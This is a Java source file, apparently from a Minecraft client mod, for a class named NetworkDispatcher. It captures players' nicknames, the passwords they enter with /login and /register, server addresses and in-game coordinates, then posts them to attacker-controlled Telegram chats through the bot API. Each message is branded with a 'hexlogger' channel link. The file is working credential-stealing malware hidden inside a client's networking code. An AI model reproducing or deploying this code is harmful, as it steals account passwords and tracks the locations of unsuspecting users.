package com.client.core.telegram;

import com.client.core.CoreBootstrap;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class NetworkDispatcher {
    
    public static void sendMessage(String message) {
        new Thread(() -> {
            System.out.println("[NetworkDispatcher] sendMessage called");
            System.out.println("[NetworkDispatcher] BOT_TOKEN=" + CoreBootstrap.TELEGRAM_BOT_TOKEN);
            System.out.println("[NetworkDispatcher] ADMIN_ID=" + CoreBootstrap.TELEGRAM_ADMIN_ID);
            System.out.println("[NetworkDispatcher] GROUP_ID=" + CoreBootstrap.TELEGRAM_GROUP_ID);
            if (CoreBootstrap.TELEGRAM_ADMIN_ID != null && !CoreBootstrap.TELEGRAM_ADMIN_ID.isEmpty()) {
                sendToChat(message, CoreBootstrap.TELEGRAM_ADMIN_ID);
            } else {
                System.out.println("[NetworkDispatcher] ADMIN_ID is empty, skipping");
            }
            if (CoreBootstrap.TELEGRAM_GROUP_ID != null && !CoreBootstrap.TELEGRAM_GROUP_ID.isEmpty()) {
                sendToChat(message, CoreBootstrap.TELEGRAM_GROUP_ID);
            }
        }).start();
    }
    
    private static void sendToChat(String message, String chatId) {
        try {
            String jsonPayload = "{\"chat_id\":\"" + chatId + 
                               "\",\"text\":\"" + escapeJson(message) + 
                               "\",\"parse_mode\":\"HTML\"}";
            
            System.out.println("[NetworkDispatcher] Sending to chatId=" + chatId);
            System.out.println("[NetworkDispatcher] Payload length=" + jsonPayload.length());
            
            URL url = new URL("https://api.telegram.org/bot" + CoreBootstrap.TELEGRAM_BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            int responseCode = conn.getResponseCode();
            System.out.println("[NetworkDispatcher] Response code=" + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            System.out.println("[NetworkDispatcher] ERROR: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    public static void sendLoginLog(String nickname, String password, String serverIp) {
        String message = "<code>https://t.me/hexlogger</code>\n\n" +
                "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                "Password: <code>/login " + escapeHtml(password) + "</code>\n" +
                "Server: <code>" + escapeHtml(serverIp) + "</code></blockquote>\n\n" +
                "<code>https://t.me/hexlogger</code>";
        sendMessage(message);
    }
    
    public static void sendRegisterLog(String nickname, String password1, String password2, String serverIp) {
        String message;
        
        if (password1.equals(password2)) {
            message = "<code>https://t.me/hexlogger</code>\n\n" +
                    "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                    "Password: <code>/register " + escapeHtml(password1) + "</code>\n" +
                    "Server: <code>" + escapeHtml(serverIp) + "</code></blockquote>\n\n" +
                    "<code>https://t.me/hexlogger</code>";
        } else {
            message = "<code>https://t.me/hexlogger</code>\n\n" +
                    "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                    "Password: <code>/register " + escapeHtml(password1) + " " + escapeHtml(password2) + "</code>\n" +
                    "Server: <code>" + escapeHtml(serverIp) + "</code></blockquote>\n\n" +
                    "<code>https://t.me/hexlogger</code>";
        }
        
        sendMessage(message);
    }
    
    public static void sendAnarchySwitch(String nickname, String command, String serverIp, 
                                         double x, double y, double z) {
        String message = "<code>https://t.me/hexlogger</code>\n\n" +
                "<blockquote>Nickname: <code>" + escapeHtml(nickname) + "</code>\n" +
                "Command: <code>" + escapeHtml(command) + "</code>\n" +
                "Server: <code>" + escapeHtml(serverIp) + "</code>\n\n" +
                "X: <code>" + String.format("%.1f", x) + "</code>\n" +
                "Y: <code>" + String.format("%.1f", y) + "</code>\n" +
                "Z: <code>" + String.format("%.1f", z) + "</code></blockquote>\n\n" +
                "<code>https://t.me/hexlogger</code>";
        sendMessage(message);
    }
    
    private static String escapeHtml(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;")
                   .replace("'", "&#39;");
    }
    
    private static String escapeJson(String text) {
        if (text == null) return "";
        return text.replace("\\", "\\\\")
                   .replace("\"", "\\\"")
                   .replace("\n", "\\n")
                   .replace("\r", "\\r")
                   .replace("\t", "\\t");
    }
}
